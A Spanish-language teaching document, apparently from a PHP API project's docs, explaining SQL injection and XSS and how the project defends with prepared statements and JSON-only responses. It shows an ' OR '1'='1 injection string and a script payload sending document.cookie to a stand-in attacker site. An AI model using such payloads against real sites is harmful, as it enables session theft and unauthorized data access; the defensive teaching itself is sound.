# Inyeccion SQL y XSS: que son y como se evitan aca

Estos dos ataques aparecen en cualquier lista de "seguridad web basica", y
conviene entenderlos de memoria porque son de los mas viejos y mas
explotados. Los dos comparten la misma idea de fondo: **un dato que mando el
usuario termina siendo interpretado como codigo**, en vez de como dato.

## Inyeccion SQL (SQL injection)

### El problema

Imaginate una consulta armada asi, pegando el texto directo:

```php
// MAL - NUNCA HACER ESTO
$sql = "SELECT * FROM usuarios WHERE email = '" . $_POST['email'] . "'";
```

Si alguien manda como email el texto `' OR '1'='1`, la consulta que termina
ejecutando el motor de base de datos es:

```sql
SELECT * FROM usuarios WHERE email = '' OR '1'='1'
```

`'1'='1'` es siempre verdadero, asi que la condicion completa es siempre
verdadera: la consulta devuelve **todos** los usuarios de la tabla, no
ninguno en particular. Con variantes de esta misma idea se puede ademas
borrar tablas, robar contrasenas, o loguearse sin saber ninguna clave.

El nombre "inyeccion" es literal: el atacante *inyecta* codigo SQL propio
adentro de la consulta, aprovechando que el programa no distinguio entre "el
texto que escribio el usuario" y "el codigo SQL que se va a ejecutar".

### La solucion: consultas preparadas

```php
// BIEN
$sql = "SELECT * FROM usuarios WHERE email = :email";
$query = $connection->prepare($sql);
$query->execute([':email' => $email]);
```

Aca pasan dos cosas separadas: primero el motor recibe y entiende el SQL
(con `:email` como un espacio vacio, un placeholder), y **despues** recibe el
valor de `$email` por otro canal, ya no como texto que hay que interpretar
sino como un dato plano. No importa lo que el usuario haya escrito adentro
-aunque sea `' OR '1'='1`- el motor lo va a tratar siempre como el valor
literal del email, nunca como codigo SQL. Es imposible "escaparse" de la
consulta.

### Donde esta esto en el proyecto

Los repositories (`ProductRepository`, `UserRepository`, en `api-simple/` y
`api-completa/`) hablan con MySQL de verdad, con PDO, y usan consultas
preparadas en TODAS partes, sin excepcion:

```php
$sql = 'SELECT * FROM productos WHERE id = :id';
$query = $this->db->prepare($sql);
$query->execute([':id' => $id]);
```

## Cross-Site Scripting (XSS)

### El problema

Pasa cuando una aplicacion **muestra** en una pagina HTML un dato que vino
del usuario, sin tratarlo con cuidado. Ejemplo tipico: un campo de
comentarios que guarda lo que la gente escribe y despues lo muestra a todo
el mundo.

Si alguien escribe como comentario:

```html
<script>document.location = 'https://sitio-malo.com/robar?cookie=' + document.cookie</script>
```

Y la pagina lo inserta directo en el HTML sin escapar, el navegador de
**cualquiera que vea ese comentario** va a ejecutar ese script como si fuera
parte legitima de la pagina. Con eso se pueden robar sesiones, redirigir a
sitios falsos, o modificar lo que ve la victima.

En `api-completa`, la cookie del JWT usa `HttpOnly`, asi que `document.cookie` no
puede leerla. Eso reduce el robo directo del token, aunque XSS sigue siendo
peligroso: un script malicioso todavia podria realizar acciones desde la
pagina de la victima. Por eso el frontend igualmente debe evitar insertar
HTML sin escapar.

Hay tres variantes conocidas (**reflejado**: el script viaja en la URL del
pedido y rebota en la respuesta; **almacenado**: el script queda guardado en
la base y se sirve a cada visitante, como el ejemplo de arriba; **DOM**:
ocurre enteramente en JavaScript del navegador, sin pasar por el servidor),
pero la idea de fondo es siempre la misma: HTML/JS ajeno termino
ejecutandose donde no debia.

### Por que esta API en particular no es vulnerable a esto

Esta API **nunca genera HTML**. Todo lo que responde pasa por
[Response.php](../api-completa/core/Response.php), que arma JSON:

```php
header('Content-Type: application/json; charset=utf-8');
echo json_encode($body, ...);
```

Un navegador nunca interpreta JSON como codigo: lo trata como texto plano.
Aunque guardes `<script>...</script>` como nombre de un producto, la API lo
va a guardar tal cual y lo va a devolver tal cual dentro de un JSON. No hay
manera de que eso, saliendo de aca, se ejecute como script.

### Entonces, ?donde SI hay que cuidarse de XSS?

En el **frontend** - la pagina o app que consume esta API y se encarga de
mostrar esos datos como HTML. Ahi si hay que tener cuidado. La buena noticia
es que los frameworks modernos ya lo hacen solos: en React, por ejemplo,
`{producto.nombre}` escapa el texto automaticamente. El peligro aparece
cuando alguien usa a proposito algo como `dangerouslySetInnerHTML` (React) o
`innerHTML` (JavaScript puro) para insertar HTML sin escapar.

**La regla general, y por que en esta API no "limpiamos" la entrada:** la
practica moderna es *sanitizar en la salida*, no en la entrada. Es decir: no
le cortamos ni le modificamos al usuario lo que escribio al guardarlo (eso
ademas podria arruinar datos legitimos, como alguien que de verdad quiere
escribir sobre HTML en una descripcion), sino que quien **muestra** ese dato
despues es responsable de escaparlo segun el medio donde lo va a mostrar
(HTML, un log, un PDF...).

## Resumen para no errarle

| | Inyeccion SQL | XSS |
|---|---|---|
| ?Que se cuela? | codigo SQL ajeno | HTML/JavaScript ajeno |
| ?Donde se ejecuta? | en la base de datos | en el navegador de la victima |
| ?Como se evita? | consultas preparadas (parametros aparte del SQL) | escapar al mostrar HTML |
| ?Aplica hoy en esta API? | si, y ya esta resuelto (consultas preparadas en todos los repositories) | no (la API solo devuelve JSON, nunca HTML) |
| ?Quien tiene que cuidarse? | el repository | el frontend que consuma esta API |

